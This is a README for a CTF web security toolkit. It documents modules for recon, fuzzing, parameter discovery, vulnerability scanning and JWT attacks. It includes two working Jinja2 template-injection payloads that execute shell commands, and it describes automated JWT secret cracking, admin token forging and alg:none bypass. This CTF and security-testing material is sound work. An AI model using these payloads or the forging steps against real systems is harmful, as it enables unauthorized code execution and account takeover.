# CTF Web Toolkit v3.0

> Modular web security testing suite built for CTF web challenges.  
> Covers recon → fuzzing → parameter discovery → vulnerability scanning → auth testing in one toolkit.

[![Python](https://img.shields.io/badge/Python-3.8+-blue?style=flat-square&logo=python)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
[![TryHackMe](https://img.shields.io/badge/TryHackMe-Top%204%25-red?style=flat-square&logo=tryhackme)](https://tryhackme.com/p/nithish6878)

---

## Modules

| Module | Command | What it does |
|--------|---------|--------------|
| `recon.py` | `recon` | Headers, sensitive files, JS parsing, link crawling |
| `fuzzer.py` | `fuzz` | Endpoint discovery with smart depth probing |
| `scanner.py` | `scan` | Hidden parameter discovery via response diffing |
| `vulnscan.py` | `vuln` | SQLi · XSS · SSTI · LFI · SSRF · IDOR · RCE · Open Redirect · CRLF |
| `authtest.py` | `auth` | JWT cracking/forging · cookie analysis · default creds |
| `fullscan.py` | `full` | Runs all modules sequentially |
| `wordlist.py` | `words` | Smart wordlist generator |

---

## Quick Start

```bash
git clone https://github.com/nithish687894/ctf-web-toolkit.git
cd ctf-web-toolkit
pip install -r requirements.txt
```

**Run everything at once:**
```bash
python3 -m ctf_toolkit full -u http://target.com
```

**Or run individual modules:**
```bash
python3 -m ctf_toolkit recon  -u http://target.com
python3 -m ctf_toolkit fuzz   -u http://target.com --smart --depth 2
python3 -m ctf_toolkit scan   -u http://target.com/api/user
python3 -m ctf_toolkit vuln   -u http://target.com --type sqli,ssti,lfi
python3 -m ctf_toolkit auth   -u http://target.com --jwt-only
python3 -m ctf_toolkit words  --custom-names flag,admin,secret --save wl.txt
```

---

## Usage Examples

### Standard CTF Web Challenge

```bash
# Step 1 — Recon: exposed files, headers, JS secrets
python3 -m ctf_toolkit recon -u http://target.com -o recon.json

# Step 2 — Fuzz: find hidden endpoints
python3 -m ctf_toolkit fuzz -u http://target.com --smart --custom-names flag,admin,debug

# Step 3 — Vuln scan a discovered endpoint
python3 -m ctf_toolkit vuln -u http://target.com/api/search --type sqli,ssti

# Step 4 — Auth: crack JWTs, test default creds
python3 -m ctf_toolkit auth -u http://target.com
```

### JWT Attack

```bash
# Auto-detect JWT → brute secret → forge admin token
python3 -m ctf_toolkit auth -u http://target.com --jwt-only
```

The tool will:
1. Extract any JWT from cookies, headers, or response body
2. Decode and display the header/payload
3. Brute-force common secrets (`secret`, `password`, `flag`, `admin`…)
4. If cracked — forge a new admin-role JWT ready to use
5. Generate an `alg:none` bypass token automatically

### SSTI Testing

```bash
python3 -m ctf_toolkit vuln -u http://target.com/render --type ssti
```

Payloads cover Jinja2, Twig, ERB, Freemarker, and Thymeleaf. Includes RCE chains for Jinja2:
```
{{lipsum.__globals__['os'].popen('cat /flag').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Custom Wordlist Fuzzing

```bash
# Generate and save a challenge-specific wordlist
python3 -m ctf_toolkit words --custom-names player,score,game --api-style --depth 2 --save game.txt

# Use it with the fuzzer
python3 -m ctf_toolkit fuzz -u http://target.com --wordlist-file game.txt --all-methods
```

---

## All Options

### Common options (work on every module)

```
-u URL              Target URL (required)
-t INT              Threads (default: 10)
-d FLOAT            Delay between requests in seconds
--proxy URL         HTTP proxy (e.g. http://127.0.0.1:8080 for Burp)
--cookie "..."      Cookie header
--auth-token "eyJ…" Bearer JWT token
--header "K: V"     Custom header (repeatable)
-o FILE             Save results to JSON
```

### Fuzzer extras

```
--depth 1-3         Fuzz depth (default: 1)
--smart             Auto-probe discovered endpoints for sub-paths
--all-methods       Test GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD, TRACE
--custom-names      Keywords to expand into endpoint variations
--wordlist-file     External wordlist file
```

### VulnScan extras

```
--type sqli,xss,ssti,lfi,ssrf,idor,rce,redirect,crlf
```

### Auth extras

```
--jwt-only          Only run JWT analysis
--cookie-only       Only analyze cookies
--creds-only        Only test default credentials
```

### Full scan extras

```
--skip recon,fuzz,scan,vuln,auth    Skip specific modules
```

---

## Changing Flag Formats

Edit `ctf_toolkit/core.py` line ~18:

```python
FLAG_FORMATS = [
    r'flag\{[^}]+\}',
    r'HTB\{[^}]+\}',
    r'THM\{[^}]+\}',
    r'MYCTF\{[^}]+\}',   # ← add yours here
    ...
]
```

---

## Project Structure

```
ctf-web-toolkit/
├── ctf_toolkit/
│   ├── __init__.py       # Package metadata
│   ├── __main__.py       # python3 -m ctf_toolkit entry
│   ├── main.py           # Command router
│   ├── core.py           # Shared utilities, flag/secret detection, HTTP session
│   ├── wordlist.py       # Endpoint & parameter wordlists, wordlist builder
│   ├── recon.py          # Reconnaissance module
│   ├── fuzzer.py         # Endpoint fuzzer
│   ├── scanner.py        # Parameter scanner
│   ├── vulnscan.py       # Vulnerability scanner
│   ├── authtest.py       # Authentication tester
│   └── fullscan.py       # Full scan orchestrator
├── docs/
│   ├── recon.md          # Recon module deep-dive
│   └── vulnscan.md       # VulnScan payload reference
├── examples/
│   ├── standard_workflow.py   # Typical CTF web challenge flow
│   └── jwt_attack.py          # JWT-focused attack example
├── tests/
│   └── test_core.py      # Unit tests (no network required)
├── requirements.txt
├── setup.py
└── README.md
```

---

## Platforms This Was Built For

Tested against challenges on:

- [TryHackMe](https://tryhackme.com/p/nithish6878) — Global Top 4% · 139 rooms
- [Root-Me](https://root-me.org)
- Hackdemy · CyberNova · HACKQUEST 2K26

---

## Legal

> For authorized testing and CTF challenges only.  
> Do not run against systems you do not have explicit permission to test.

---

## Author

**Nithishkumar S** — B.Tech Computer Science (Cybersecurity), SRM Institute  
[GitHub](https://github.com/nithish687894) · [TryHackMe](https://tryhackme.com/p/nithish6878) · [LinkedIn](https://linkedin.com/in/nithishkumar-s)
